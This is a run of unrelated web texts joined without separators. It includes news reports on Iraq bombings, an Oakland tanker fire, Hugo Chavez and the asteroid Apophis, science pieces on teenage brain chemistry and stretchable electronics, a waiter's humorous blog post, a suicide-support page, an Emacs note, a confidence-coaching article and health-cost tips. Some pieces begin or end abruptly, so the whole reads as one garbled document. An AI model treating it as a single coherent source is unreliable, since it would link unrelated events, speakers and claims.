• 3,377 US troops killed since the March 2003

Adjust font size :
BAGHDAD , Iraq ( CNN ) -- Nine U.S. soldiers died in Iraq on Sunday , including six killed in a roadside bombing northeast of Baghdad , the U.S. military reported .
A civilian journalist was also killed in the bombing in Diyala province .
The journalist 's identity was not released .
The six soldiers killed were from the Army 's Task Force Lightning .
Two soldiers from that unit were wounded in the same attack , the military reported .
In addition , the military reported the deaths of two Marines and another soldier who died over the weekend , bringing the U.S. toll in Iraq to 3,377 since the March 2003 invasion that toppled Iraqi dictator Saddam Hussein .
In the first six days of May , 25 Americans have been killed in Iraq .
Torture chamber discovered
U.S. and Iraqi forces chasing a suspected terrorist with ties to Iran early Sunday discovered a bloodstained torture chamber and a massive amount of artillery stored in a building in Baghdad 's Sadr City , the U.S. military said .
" Had that thing gone off -- when you start talking about 150 artillery shells -- the extensive damage that it could have done in killing innocent civilians in Sadr City would have been horrific , " Maj. Gen. William Caldwell , a U.S. military spokesman , said at a news conference Sunday .
The building was destroyed in a controlled explosion by a U.S. military ordnance team .
Video showed a massive pile of rubble , with some debris landing on nearby cars .
Other vehicles had shattered windows , possibly from the impact of the blast .
There were no reports of any casualties among coalition or Iraqi security forces .
Sadr City , a densely populated Shiite neighborhood , is a stronghold of radical Shiite cleric Muqtada al - Sadr 's Mehdi Army militia .
Caldwell would not reveal specific information about the " known terrorist " that was the target of the intelligence - driven raid because he was still on the run .
" As best we know , this was some kind of Shia extremist element , some sort of secret cell , " Caldwell said .
Multiple bomb attacks
Twelve Iraqi police officers were killed and 11 were wounded -- in addition to two U.S. soldiers -- when insurgents attacked an Iraqi police headquarters in Samarra , just north of the Iraqi capital , on Sunday , the U.S. military said .
A Samarra police official said a suicide car bomb exploded outside the headquarters just as a curfew imposed to prevent such attacks was lifted .
The U.S. military called in reinforcements to help secure the area .
While enforcements were on their way to the area , insurgents fired upon them with small arms and rocket - propelled grenades , wounding two U.S. soldiers , the military said .
A coalition vehicle was also damaged .
Throughout the day , insurgents wreaked havoc by killing at least 39 people and wounding dozens of others in multiple bomb attacks in Baghdad .
Bayaa car bomb kills 33
The deadliest attack took place in a market in southwestern Baghdad 's Bayaa section around noon .
An Iraqi Interior Ministry official said a bomb in a parked car exploded , killing 33 people and wounding 74 others .
The U.S. military said Iraqi police and soldiers cordoned off the area and secured the blast site .
Insurgents frequently target busy markets to produce the most carnage .
Police and government officials are also prime targets .
A roadside bomb killed a police officer and wounded three others who were patrolling Baghdad 's Saydia neighborhood , an Interior Ministry official said .
And in Baghdad 's central Mansour district , a car parked near the Labor Ministry exploded , killing at least five people and wounding 10 others , a ministry official said .
Separately , 24 bodies were found scattered across the capital Sunday , according to an Interior Ministry official .
CNN 's Ingrid Formanek and Jomana Karadsheh contributed to this report .
Tanker fire destroys part of MacArthur Maze / 2 freeways closed near Bay Bridge
2007-04-29 18:03:00 PDT
OAKLAND --
Huge leaping flames from an exploding gasoline tanker melted the steel underbelly of a highway overpass in the East Bay 's MacArthur Maze early this morning , causing it to collapse onto the roadway below and virtually ensuring major traffic problems for weeks to come .
The elevated roadway that fell carried eastbound traffic from the Bay Bridge onto Interstates 580 and 980 and state Highway 24 .
It draped like a blanket over a roadway below , a connector from southbound I - 80 to I - 880 that also was severely damaged .
The single - vehicle crash occurred on the lower roadway when the tanker , loaded with 8,600 gallons of unleaded gasoline and heading from a refinery in Benicia to a gas station on Hegenberger Road in Oakland , hit a guardrail at 3:41 a.m .
Engineers said the green steel frame of the I - 580 overpass and the bolts holding the frame together began to melt and bend in the intense heat
-- and that movement pulled the roadbed off its supports .
California Highway Patrol spokesman Trent Cross said the driver of the tanker , James Mosqueda , 51 , of Woodland ( Yolo County ) , was traveling too fast in a 50 mph zone when his truck overturned and burst into flames .
Mosqueda , an employee of Sabek Transportation in San Francisco for 10 months , got out of the truck on his own after it overturned and hailed a taxi that took him to Kaiser Hospital in Oakland , witnesses and police said .
He has been transferred to the burn unit at St. Francis Hospital in San Francisco , where his father said he was " doing OK " this afternoon , having sustained burns on his face , neck and hands .
The family expected Mosqueda to remain hospitalalized two or three more days .
Cross said Mosqueda had a valid driver 's license and there is no indication he was under the influence of alcohol or drugs when he crashed .
Oakland firefighters , the first public safety workers on the scene , arrived with two engines at 3:55 a.m. , Capt .
Cedric Price said .
" We did n't know it was a tanker truck that was involved .
As soon as that was established we immediately upgraded to a large scale incident response team and added two more engines and two trucks , " Price said .
Firefighters immediately noticed the upper connector ramp was buckling and seven minutes after they arrived -- at 4:02 a.m. -- it collapsed , Price said .
Now there were no more structures threatened , the firefighters ' approach shifted .
" With no structures or lives in jeopardy and with 8,000 gallons of flammable fuel involved , you 're basically better off letting it burn itself out , " said Price .
Firefighters used only water to control the blaze , which took about two hours , he said .
Had there been lives at risk , firefighters would have used foam to fight the blaze , but it would have run off into the nearby Bay water , polluting it .
" That this did n't happen on a weekday morning might have been the only beauty of it , " said Price .
With the help of protective gear and breathing devices , firefighter exposure to the fumes was minimal , according to Price .
A total of 29 Oakland Fire Department personnel were on scene as well as one engine from Emeryville .
A smaller crew of Oakland firefighters remained there through the early evening to watch for potential dangers .
Jennifer Summers , 36 , was driving from her costume design job in San Francisco home to the Oakland hills just before 4 a.m. when she saw black smoke and realized the freeway was on fire .
She quickly pulled off and looped around so she could see what was going on .
When she got out of her car , flames were shooting into the sky over multiple layers of freeway and she could hear loud crackling and explosions .
" There were bright , bright orange flames and they were huge , " said Summers .
" There were cars driving through the flames .
The first cars slowed down like they did n't know what to do and then kept going .
I was shocked . "
Summers said dozens of vehicles stopped to watch the spectacle , which ended with a horrendous crash as the freeway collapsed in a torrent of fire and rubble .
" There was nothing you could do , " she said .
" I 'm thinking , ' Oh my God , this is going to be a nightmare with the traffic problems we already have . ' "
Isaac Rodriguez , a 53 - year - old sanitation supervisor who works the graveyard shift at East Bay Municipal Utility District 's sewage treatment plant , said his supervisor called him about 3:45 a.m. and told him to leave work because of a nearby explosion .
Rodriguez went outside with a co-worker and saw the I - 880 connector about 50 feet above him engulfed in fire with flames leaping up to the I - 580 connector above that .
" It was massive , " Rodriguez said .
" I saw movement and there was a man up there .
I started talking to the guy .
Are you the truck driver ?
' Yes . '
He said , ' I 'm burned .
I got out as soon as I could . ' "
The driver seemed disoriented .
" It looked at one time he was walking toward the truck again .
I believe he was in shock , " Rodriguez said .
Rodriguez said he regretted not thinking to send a vehicle up to get the injured man .
He and a coworker stood for some 40 minutes watching the freeway burn .
" It looked like a big slab of plastic because it was melted .
It 's made of steel and concrete and it was bent at both angles of the pillar .
It really looked fake .
...
It was an event last night that I 'm not going to forget for a long time .
It was incredible because it was a roar .
No sign of the truck remains at the scene .
One Caltrans worker there early this morning held up his thumb and forefinger an inch apart to describe how big the tanker is now .
John Goodwin , a spokesman for the regional Metropolitan Transportation Commission , said the maze is one of the worst spots for traffic in the Bay Area .
" Westbound 80 is already the most congested route in the Bay Area , and it has been for many years , " said Goodwin .
" Also , the route coming off the Bay Bridge eastbound from Treasure Island is number 10 on the regional congestion list , and with 580 gone there will be a huge impact on that already - congested route . "
Gov. Arnold Schwarzenegger plans to announce this evening that some Bay Area transit agencies will offer free rides tomorrow .
Goodwin anticipates that the impacts of the latest disaster will extend to roads far beyond the East Bay .
" This really strikes at the very center of the Bay Area freeway network , " he said , predicting the closure of the two overpassess will " have a ripple effect " across the region .
" It will put more traffic on the San Mateo Bridge , the Golden Gate and the Richmond - San Rafael bridge , " Goodwin said .
Some 35,000 cars travel the two - lane I - 880 connector each day , and 45,000 cars use the I - 580 connector , which is three lanes , said Caltrans Director Will Kempton .
Kempton said rebuilding the I - 580 connector will cost tens of millions of dollars .
The extent of the damage to the I - 880 connector cannot be determined , he said , until the debris is cleared off .
" Initial indications are that it has been severely damaged , " Kempton said " It will obviously need some work . "
This was n't the first major crash to clog the crucial traffic corridor through Oakland .
On Feb. 5 , 1995 , a tanker loaded with liquefied gas crashed and burned on the MacArthur Maze , killing the driver , injuring 10 other people and creating an all - day traffic jam .
Witnesses said at the time that the tanker , which was changing lanes when it skidded out of control , created a 100 - foot - tall fireball after it crashed on the connector between westbound I - 80 and eastbound I - 580 , which is immediately northeast of the scene of today 's crash .
The 1989 collapse of the Cypress Structure during the Loma Prieta earthquake caused years of detours and traffic problems in the same area .
Traffic on the affected roadways remains light this afternoon , apparently because many drivers canceled plans that would have required driving .
But major backups are expected , especially tonight when the Golden State Warriors take on the Dallas Mavericks tonight in the fourth game of their playoff series and Oakland 's Oracle Arena .
San Francisco Mayor Gavin Newsom , in a press conference in San Diego Sunday , said that he has spoken to Gov. Arnold Schwarzenegger 's staff about the crash aftermath -- and particularly how to accomplish repairs quickly .
Newsom said state officials are " fastracking " the repairs by using some of the same shortcuts that got Interstate 10 rebulit quickly after Southern California 's Northridge earthquake in 1994 .
As many as 40 people stood gawking at the disaster scene at various points today .
Most stood in a Caltrans construction area under the freeway and took pictures .
Some said they had heard what sounded like train cars crashing together in the nearby freight yard this morning before they saw what had happened .
Everyone agreed that the weekday commute is going to be horrible .
" It 's just going to be outrageous , " said Gary Lewis of Oakland .
" You 'll have all this traffic merging at one time . "
" They need to go back to the drawing board , " said Sandra Moore of Oakland , who had driven over the collapsed section the night before .
" I 'm sorry this had to happen , but this is a wake - up call . "
Larry Gordon of Oakland , was riveted by the scene of scorched steel and hundreds of yards of melted pavement .
" It 's incredible , amazing , " he said .
" If fire can do that a steel structure like this , what can the next earthquake do ? "
Henry Geronimo , 44 , of West Oakland , watched the cleanup operation from a fence along Mandela Parkway .
" Coming home is going to be a big big problem , " said Geronimo , who commutes to work in San Francisco as draftsman .
" Do you know how many terrorists are looking at this ?
They 're getting ideas . "
Wanda Realegeno , a 42 - year - old Richmond resident , said she is n't looking forward to her commute to school near Oakland Coliseum , which normally takes her onto the I - 800 connector that the truck was on when it crashed .
" This is amazing , " she said .
" It 's almost as bad as the earthquake .
I 'm just thinking : how am I going to get to work tomorrow ?
I was trying to figure out my path . "
They have a reputation for being sulky , uncommunicative and argumentative little brats .
But according to scientists , blaming teenagers for their tantrums and mood swings is - in the words of Kevin the teenager - " just SO unfair " .
Their petulant behaviour is all down to an unexpected chemical reaction in their developing brains .
Scientists have found that the mechanism normally used by the brain to calm itself down in stressful situations seems to work in the opposite way in teenagers , making them even more anxious .
When the brain senses a stressful situation , it reacts by switching on receptors , using a range of chemicals , including a steroid called THP .
In an adult or even a younger individual , THP would reduce anxiety .
But in experiments on adolescent mice , THP increased anxiety .
The experiments , by Sheryl Smith , a physiologist at the State University of New York , offer the first physiological explanation for adolescent mood swings .
Previous work has focused on analysing behavioural changes in teenagers during adolescence .
Her results are published today in Nature Neuroscience .
In teenagers , the behavioural response to the increased anxiety due to THP would result in even more acute stress , said Prof Smith .
How individuals reacted would depend on their personality - where some people might cry , others would get angry .
" It could be an emotional reaction and it might be fluctuating too because it's an amplified reaction to the stress which may not seem the appropriate reaction to an adult .
Yet , for the teenager , they do n't have a whole lot of control .
It could be frustrating for the teenager and the parent .
This is a reaction that seems like an over - reaction to the adult , perhaps .
But to the teenager , it is absolutely the only thing they are able to do . "
Prof Smith said that the paradoxical effect in teenagers ' brains can be explained by the fluctuation in hormones that accompanies this phase of their lives .
She successfully tested this idea by artificially altering the levels of certain hormones in the brains of her mice .
The social awkwardness of teenagers has been the subject of several studies in recent years .
Scientists have shown that the combination of having a brain that is not yet fully developed and the hormonal stresses of puberty can explain much of the infamous behaviour of adolescents .
Scientists at University College London presented research last year showing that teenagers could not help being sulky because they were still developing social skills and did not have the full mental hardware to see the world from someone else 's point of view or predict the consequences of their actions .
President Chavez has vowed to deepen his " Bolivarian revolution "
President Hugo Chavez says he wants " revolutionary laws " to enact sweeping political , economic and social changes .
He has said he wants to nationalise key sectors of the economy and scrap limits on the terms a president can serve .
Mr Chavez began his third term in office last week after a landslide election victory in December .
The bill allowing him to enact laws by decree is expected to win final approval easily in the assembly on its second reading on Tuesday .
Venezuela 's political opposition has no representation in the National Assembly since it boycotted elections in 2005 .
Pledge
Mr Chavez approved 49 laws by decree during the first year of his previous term , after the assembly passed a similar " Enabling Law " in November 2000 .
Now the president says an Enabling Law is a key step in what he calls an accelerating march toward socialism .
He has said he wants to see major Venezuelan power and telecoms companies come under state control .
Mr Chavez also called for an end to foreign ownership of lucrative crude oil refineries in the Orinoco region .
Critics of the president accuse him of trying to build an authoritarian regime with all institutional powers consolidated into his own hands .
But , National Assembly President Cilia Flores said " there will always be opponents , and especially when they know that these laws will deepen the revolution " .
Campaigning for the elections last year , Mr Chavez vowed he would strengthen his " Bolivarian revolution " , named after the 19th - Century Latin American independence fighter .
Source Municipal Redux
“ Hello and welcome , ” I say to my new two top .
“ Would either of you care for a cocktail ? ”
“ I think we ’ll just start off with some water , ” the husband , a bald man in a open collared silk shirt , replies .
“ Maybe we ’ll have wine with dinner . ”
“ Very good sir , ” I reply .
“ Might I interest you in a bottle of Pellegrino or Panna this evening ? ”
“ You do n’t have Perrier do you ? ”
“ I ’m afraid not , ” I say .
“ But we do have good old Source Municipal . ”
“ What ’s Source Municipal ? ” the man ’s wife asks .
“ The waiter ’s being funny , Alice , ” the man replies .
“ He ’s talking about tap water . ”
“ Oh that ’s cute ! ’ the wife says .
“ Source Municipal !
You make it sound like it comes from France . ”
“ Thanks madam . ”
“ Some tap water will be fine waiter , ” the man says .
“ Very good , sir . ”
I get a busboy to deliver the water , tell the couple the specials , serve them , and hustle them out the door in under sixty minutes .
I should n’t have been so eager to turn and burn , however .
The couple that slides into the newly vacated seats are regulars – regular assholes that is .
The moment their asses hit the seats their heads start swiveling Exorcist like on their necks – looking for me .
“ Waiter ! ” the husband , a silver haired , imperious looking fellow barks .
“ Where ’s our bread ?
Where ’s our dipping oil ? ”
“ Good evening sir , ” I reply .
“ Nice to see you . ”
“ Never mind that , ” the man ’s wife , an over the hill harridan snaps .
“ We want our bread right away , ”
“ Yes madam . ”
“ And make sure the bread ’s fresh , ” she says .
“ It was stale last time . ”
“ Yes madam . ”
“ Tell us the specials , ” the silver haired man orders .
As I rattle of the specials I look at the couple in front of me .
I ’ve waited on them several times .
They ’re older rich people laboring under the delusion that their wealth somehow makes them important .
The man always looks smug while his wife ’s face is a perpetually botoxified grimace .
They ’re miserable , vexing people .
Every waiter in the restaurant hates them .
“ Okay , ” the man says after I finish my recitation .
“ Now get our bread . ”
“ Yes , sir . ”
I walk away from the table .
Before I can tell a busboy to bring bread to Silver Hair and his wife , one of my other customers signals me over .
A soda needs refilling .
I grab the empty glass , refill it with Diet Coke , and return it to the thirsty customer .
To my surprise , I notice Silver Hair is now by the front desk talking to the owner .
Neither man looks happy .
“ What was that about ? ” I ask the owner when Silver Hair sits down .
“ He ’s upset you did n’t bring him bread and oil right away . ”
“ He got here two minutes ago . ” I exclaim .
“ I have other customers ! ”
“ It ’s nothing you ’re doing wrong , ” the owner says .
“ That guy ’s always been difficult . ”
“ Probably been that way all his life . ”
“ Probably . “
“ Must be tough going through life that – feeling so self important . ”
“ Do n’t worry , ” the owner says , chuckling .
“ He did n’t get away with anything .
His wife is pure penance . ”
“ I believe it . ”
“ Just get his bread before he comes over and bugs me again . ”
“ You got it . ”
I skip going through the bus boy and bring my cranky table their bread and accouterments .
Thinking he got me in trouble , Silver Hair has a shit eating grin on his face .
I want to plunge my table crumber into his right eye .
Nah , that would really get me in trouble .
“ Your bread , sir . ”
“ You forgot something , ” Silver Hair says .
“ Sir ? ”
“ The water !
Where ’s our water ? ”
“ What kind of water would you like ? ” I reply .
“ Pellegrino , Panna… ? ”
“ Just tap water , ” the wife barks .
“ With lemon . ”
“ Two glasses of Source Municipal , ” I acknowledge .
“ Right away . ”
“ Source Municipal ? ” the wife asks .
“ What ’s that ? ”
“ It ’s tap water madam , ” I say .
“ And , as a bonus , it already has a dose of Prozac in it . ”
The couple stares at me open mouthed .
“ Just what are you saying ? ” Silver Hair asks , aghast .
“ Did n’t you hear about all the drugs they found in the water supply , sir ? ” I ask .
“ It was in all the papers . ”
“ There ’s Prozac in the water ? ” the wife asks .
“ Plus Tylenol , estrogen , and anti anxiety compounds , ” I reply .
“ It seems our reservoirs are veritable pharmacies . ”
( Of course you ’d have to drink eight million glasses of water to come close to getting a dose of anything – but these idiots do n’t need to know that . )
“ I thought you were being funny there , ” Silver Hair says .
“ I would n’t dream of it , sir . ”
“ And we ’ll have a bottle of Panna instead of tap , ” Silver Hair says .
“ Very good , sir .
Right away , sir . ”
As I depart the table to get the expensive H20 I smile to myself .
For all their money and delusions my arrogant couple are easily offended and manipulated sheep .
Bahhhhhh .
Me ?
I ’m still drinking tap water .
I need the Prozac .
If you are feeling suicidal now , please stop long enough to read this .
It will only take about five minutes .
I do not want to talk you out of your bad feelings .
I am not a therapist or other mental health professional - only someone who knows what it is like to be in pain .
I do n't know who you are , or why you are reading this page .
I only know that for the moment , you 're reading it , and that is good .
I can assume that you are here because you are troubled and considering ending your life .
If it were possible , I would prefer to be there with you at this moment , to sit with you and talk , face to face and heart to heart .
But since that is not possible , we will have to make do with this .
I have known a lot of people who have wanted to kill themselves , so I have some small idea of what you might be feeling .
I know that you might not be up to reading a long book , so I am going to keep this short .
While we are together here for the next five minutes , I have five simple , practical things I would like to share with you .
I wo n't argue with you about whether you should kill yourself .
But I assume that if you are thinking about it , you feel pretty bad .
Well , you 're still reading , and that 's very good .
I 'd like to ask you to stay with me for the rest of this page .
I hope it means that you 're at least a tiny bit unsure , somewhere deep inside , about whether or not you really will end your life .
Often people feel that , even in the deepest darkness of despair .
Being unsure about dying is okay and normal .
The fact that you are still alive at this minute means you are still a little bit unsure .
It means that even while you want to die , at the same time some part of you still wants to live .
So let 's hang on to that , and keep going for a few more minutes .
Start by considering this statement :
Suicide is not chosen ; it happens
when pain exceeds
resources for coping with pain .
That 's all it 's about .
You are not a bad person , or crazy , or weak , or flawed , because you feel suicidal .
It does n't even mean that you really want to die - it only means that you have more pain than you can cope with right now .
If I start piling weights on your shoulders , you will eventually collapse if I add enough weights ... no matter how much you want to remain standing .
Willpower has nothing to do with it .
Of course you would cheer yourself up , if you could .
Do n't accept it if someone tells you , " That 's not enough to be suicidal about . "
There are many kinds of pain that may lead to suicide .
Whether or not the pain is bearable may differ from person to person .
What might be bearable to someone else , may not be bearable to you .
The point at which the pain becomes unbearable depends on what kinds of coping resources you have .
Individuals vary greatly in their capacity to withstand pain .
When pain exceeds pain - coping resources , suicidal feelings are the result .
Suicide is neither wrong nor right ; it is not a defect of character ; it is morally neutral .
It is simply an imbalance of pain versus coping resources .
You can survive suicidal feelings if you do either of two things : ( 1 ) find a way to reduce your pain , or ( 2 ) find a way to increase your coping resources .
Both are possible .
Now I want to tell you five things to think about .
1
You need to hear that people do get through this -- even people who feel as badly as you are feeling now .
Statistically , there is a very good chance that you are going to live .
I hope that this information gives you some sense of hope .
2
Give yourself some distance .
Say to yourself , " I will wait 24 hours before I do anything . "
Or a week .
Remember that feelings and actions are two different things - just because you feel like killing yourself , does n't mean that you have to actually do it right this minute .
Put some distance between your suicidal feelings and suicidal action .
Even if it 's just 24 hours .
You have already done it for 5 minutes , just by reading this page .
You can do it for another 5 minutes by continuing to read this page .
Keep going , and realize that while you still feel suicidal , you are not , at this moment , acting on it .
That is very encouraging to me , and I hope it is to you .
3
People often turn to suicide because they are seeking relief from pain .
Remember that relief is a feeling .
And you have to be alive to feel it .
You will not feel the relief you so desperately seek , if you are dead .
4
Some people will react badly to your suicidal feelings , either because they are frightened , or angry ; they may actually increase your pain instead of helping you , despite their intentions , by saying or doing thoughtless things .
You have to understand that their bad reactions are about their fears , not about you .
But there are people out there who can be with you in this horrible time , and will not judge you , or argue with you , or send you to a hospital , or try to talk you out of how badly you feel .
They will simply care for you .
Find one of them .
Now .
Use your 24 hours , or your week , and tell someone what 's going on with you .
It is okay to ask for help .

Look in the front of your phone book for a crisis line
Call a psychotherapist
Carefully choose a friend or a minister or rabbi , someone who is likely to listen
But do n't give yourself the additional burden of trying to deal with this alone .
Just talking about how you got to where you are , releases an awful lot of the pressure , and it might be just the additional coping resource you need to regain your balance .
5
Suicidal feelings are , in and of themselves , traumatic .
After they subside , you need to continue caring for yourself .
Therapy is a really good idea .
So are the various self - help groups available both in your community and on the Internet .
Well , it 's been a few minutes and you 're still with me .
I 'm really glad .
Since you have made it this far , you deserve a reward .
I think you should reward yourself by giving yourself a gift .
The gift you will give yourself is a coping resource .
Remember , back up near the top of the page , I said that the idea is to make sure you have more coping resources than you have pain .
So let 's give you another coping resource , or two , or ten ...!
until they outnumber your sources of pain .
Now , while this page may have given you some small relief , the best coping resource we can give you is another human being to talk with .
If you find someone who wants to listen , and tell them how you are feeling and how you got to this point , you will have increased your coping resources by one .
Hopefully the first person you choose wo n't be the last .
There are a lot of people out there who really want to hear from you .
It 's time to start looking around for one of them .
Now : I 'd like you to call someone .
And while you 're at it , you can still stay with me for a bit .

MIT ’s SIPB IAP activities page is a treasure trove of interesting stuff .
Among the many classes programmed for 2007 , there ’s one that i’m sure will be interesting to many mew readers : Being Productive With Emacs .
The good news is that you do n’t need to travel to Boston to get this excellent illustrated introduction to Emacs , continued with a customization and an extension guide .
Being the slides of three presentations ( by Phil Sung ) , they ’re sketchy at places , but make for a great introduction to Emacsland nonetheless , and there ’s a trick or two for seasoned users as well .

SAN FRANCISCO ( Reuters ) -
An asteroid may come uncomfortably close to Earth in 2036 and the United Nations should assume responsibility for a space mission to deflect it , a group of astronauts , engineers and scientists said on Saturday .
Astronomers are monitoring an asteroid named Apophis , which has a 1 in 45,000 chance of striking Earth on April 13 , 2036 .
Although the odds of an impact by this particular asteroid are low , a recent congressional mandate for NASA to upgrade its tracking of near - Earth asteroids is expected to uncover hundreds , if not thousands of threatening space rocks in the near future , former astronaut Rusty Schweickart said .
“ It ’s not just Apophis we ’re looking at .
Every country is at risk .
We need a set of general principles to deal with this issue , ” Schweickart , a member of the Apollo 9 crew that orbited the earth in March 1969 , told an American Association for the Advancement of Science conference in San Francisco .
Schweickart plans to present an update next week to the U.N. Committee on Peaceful Uses of Outer Space on plans to develop a blueprint for a global response to an asteroid threat .
The Association of Space Explorers , a group of former astronauts and cosmonauts , intends to host a series of high - level workshops this year to flesh out the plan and will make a formal proposal to the U.N. in 2009 , he said .
Schweickart wants to see the United Nations adopt procedures for assessing asteroid threats and deciding if and when to take action .
The favored approach to dealing with a potentially deadly space rock is to dispatch a spacecraft that would use gravity to alter the asteroid ’s course so it no longer threatens Earth , said astronaut Ed Lu , a veteran of the International Space Station .
The so - called Gravity Tractor could maintain a position near the threatening asteroid , exerting a gentle tug that , over time , would deflect the asteroid .
An asteroid the size of Apophis , which is about 460 feet
long , would take about 12 days of gravity - tugging , Lu added .
Mission costs are estimated at $ 300 million .
Launching an asteroid deflection mission early would reduce the amount of energy needed to alter its course and increase the chances of a successful outcome , Schweickart said .
NASA says the precise effect of a 460 - foot ( 140 - meter ) object hitting the Earth would depend on what the asteroid was made of and the angle of impact .
Paul Slovic , president of Oregon - based Decision Research , which studies judgment , decision - making and risk analysis , said the asteroid could take out an entire city or region .
Imagine an electrically conductive material that can warp and stretch like a rubber band but immediately snap back without any damage .
Such technology could pave the way for sensitive synthetic skin , wearable electronics , malleable microphones , and even new pacemakers that beat and flex with the heart .
Stephanie Lacour , a key pioneer of stretchable electronics at Cambridge University in the United Kingdom , has designed an electrical circuit that “ can be stretched 100 percent in one direction ” without losing function , according to Barclay Morrison , her collaborator at Columbia University .
Lacour , who was honored this September by the Massachusetts Institute of Technology for her work , is using the material to design a prosthetic “ that would mimic your own skin , ” so that a man who has lost his arm would one day not only be able to shave his face , but even be able to feel just how close a shave it was .
Lacour found that by applying very thin gold ribbons , only nanometers thick , to an elastic substrate called poly - dimethyl siloxane ( PMDS ) , she could create a pliant circuit .
Gold itself is not supple , tending to break under minimal strain , and Lacour does not yet understand how its properties change when imbedded in the PMDS .
However , she immediately recognized the discovery as an opportunity for innovation .
Although the field of robotics has been rapidly providing amputees with mechanical prosthetics that accurately mimic the movement of lost limbs , engineers have not yet found a way to reproduce sensation .
The only “ skin ” currently available for mechanical limbs serves a purely cosmetic function .
Lacour envisions that her material could interact with the environment such that an amputee could wear as if it were his own skin .
Two essential properties of human skin are its abilities to move with the body and to perceive pressure , according to Lacour .
Every time we turn the page of a book , walk barefoot over a gravel road , or roll out a piecrust , we decode information about our surroundings .
In a robotic arm or leg , this information would provide crucial feedback about its spatial position , allowing the device to adjust continuously to its environment .
But the flexible electronics that are currently available are still too rigid and unable to integrate the information from pressure applied over wide areas .
The gold filaments in Lacour ’s system , acting as connectors between silicon transistors , may solve this problem .
An experiment published by Lacour and Sigurd Wagner of Princeton University in the journal Applied Physics Letters describes how they used this technology to design a large - area pressure sensor .
At task now is adapting the material so that it will be safe to use in the body since a key component of the material , chromium , is toxic to humans .
Morrison , Lacour ’s collaborator at Columbia , is modifying her design for use in biomedical experiments modeling brain trauma .
Stretchable electronics provide him a way to study severe head trauma in real time .
After growing brain tissue on the material , Morrison will contort it to simulate the damage resulting from a car accident or baseball bat to the head .
Embedded microelectrodes will then give a read - out of the electrical properties of the tissue as it suffers damage .
Morrison also sees potential for stretchy circuits to improve the design of electronic surgical implants .
Hearing aids , pacemakers , and brain stimulators used to treat Parkinson ’s Disease all require an interface between rigid electrodes and soft living tissue .
The silicon in most microelectrode arrays “ is one million times more rigid than the brain , ” says Morrison .
Because the body is in constant motion , friction can cause scarring at the points of connection , making the devices less effective over time .
With a material that more closely resembles the flexibility of living tissue , Morrison expects that we will begin to see medical devices that function longer and more effectively .
Although Lacour has focused her work on medical applications , she is extremely hopeful that it will impact fields far beyond her own .
Lacour even imagines that airplane manufacturers will use the material to make flight readiness checks safer by creating an electronic sheath around an airplane ’s wing that would continuously monitor the integrity of the structure .
Researchers have been playing with slightly bendable electronics for a while , but with this material they believe they have an extraordinary new toy in their box .
“ That you can stretch metal and it remains conductive ” is pretty amazing , Morrison says .
How To Stop Acting Submissive and Start Being Confident by Eric Disco
She ’s gorgeous .
We ’re standing near the copy machine as I banter with her about work .
“ They have you making photocopies again ?
Oh my god , they may as well chain you to your desk ! ”
We eventually get into a conversation .
I notice it happening again : my hands are in my pockets .
I ’ve been doing this a lot lately and I need to eliminate it .
It is submissive behavior .
In The Reconciled Hierarchy , Frans de Waal comments on the observation that the dominant one is often sought after or followed by other members of the group .
“ Whereas pure fear would induce an animal to run away and never come back , social animals usually stay and show submission .
Submission results from ambivilence between fear and attraction . ”
When you see an extremely attractive woman , you are motivated to talk to her because you are attracted to her .
Yet you have anxiety .
Since you have such high levels of both fear and attraction , you act with submission .
You communicate your fear through certain reliable mechanisms .
You have learned these submissive mechanisms so that you can attain friendly harmonic social integration with those who have power in that particular group .
You avoid eye contact .
You only look when you know the person is n’t looking at you .
You look down .
You avoid conflict by averting your gaze .
You become invisible .
You make yourself “ smaller ” physically .
You take up less space .
You put your hands in your pockets .
You speak quietly .
You avoid generating attention toward your actions .
You follow rather than lead .
You avoid initiating interactions .
You act with body language that purposefully shows a lack of confidence .
You do not logically in your mind decide to act with a lack of confidence .
Your behavior is engrained in you as a means of survival .
Just like your fear would prevent you from stepping off of a cliff , your body prevents you from behaving too boldly .
It prevents you from taking inappropriate social risks that would jeopardize you .
You learn to communicate submissive signals in order to remain part of the social group on which your survival depends .
These communication signals are highly consistent and predictable .
De Wall writes ,
Rowell has already demonstrated that subordinate behaviors are remarkably consistent in their direction as compared to most dominant or aggressive beahviors .
A further distinction with the category of subordinate behavior was reported for Java monkeys by Angst and de Waal .
These macaques signal subordinance by means of a stereotypical facial experession in which the teeth are bared .
This facial display is completely unidirectional between individuals , i.e. , if during a given period A shows the signal to B , B will never show it to A .
Non-ritualised expressions of fear , such as avoidance and flight , show exceptions to this rule in up to 5 % of the cases .
How do you change these submissive signals into confident signals ?
1. Become aware of what the signals are .
There are a lot of ways you can do this .
You can read about it .
You can watch DVD’s .
You can befriend and imitate confident guys .
You can get coaching from people who know how to bring out confidence in guys .
Reading and watching this information is helpful , but it can not be overlooked that this is a SOCIAL process .
Reading about this stuff will only have limited results as compared to socially interacting with people who know about this stuff .
2. Practice changing these submissive signals .
Your body will fight you when you begin to change this stuff .
Your primal brain wants to protect you as you step near the edge of that cliff .
It can be an uphill climb at first .
But it begins to snowball .
Confidence breeds confidence .
As you eliminate overly submissive behavior , your body starts to understand your place as being different than it was before .
Your hands come out of your pockets .
Your begin to speak with a more confident tone .
And soon , you become a visible confident part of every social interaction .
And your life is never the same .

Cheap Ways To Keep Fit And Stay Healthy
Doing simple , cost effective things to stay healthy today will keep you from spending more money down the line .
The truth is , the cost of treating chronic disease can be debilitating enough to cause job loss ; it ’s cited as one of the top reasons why people go bankrupt .
The high cost of poor health is a leading cause of bankruptcy in this country .
Let ’s take a look at how big a bite our medical costs are taking from our savings .
Get a load of this study that proclaims that the average U.S. family will be paying more in health care over time , thanks to rising prescription drug prices ( among other things ) .
The trend with medical insurance is n’t so encouraging either .
It seems that employers will be pushing more of their employees ’ heath insurance costs on their workers .
More employers are passing the cost of health and medical care to their employees .
Have you noticed that premiums , out - pocket - costs , deductibles , coinsurance costs and copayments are rising ?
Some studies show that employers are paying around 60 % of these costs while employees are covering 40 % .
With so much money spent on health , the best way to counteract this assault on our budgets is to preserve our health and well - being as much as possible .
You can keep your medical and insurance bills in check by becoming more fit .
Here are some tips I have on the subject :
Spend Less on a Simpler Life
First things first : take the stress out of your life .
We ’re a workaholic nation where vacations are not as popular as they are in other countries 😉 .
We love chasing the Joneses and aspiring to fulfill the American Dream .
All this results in our physical and mental exhaustion , and growing complexities in our lives , all for the greater glory of material wealth .
If your life is full to the brim and you are no longer able to stop and smell the roses , then you ’re doing a number on your health .
One of the first steps to better health is by gaining better control over your life .
You can start by simplifying it .
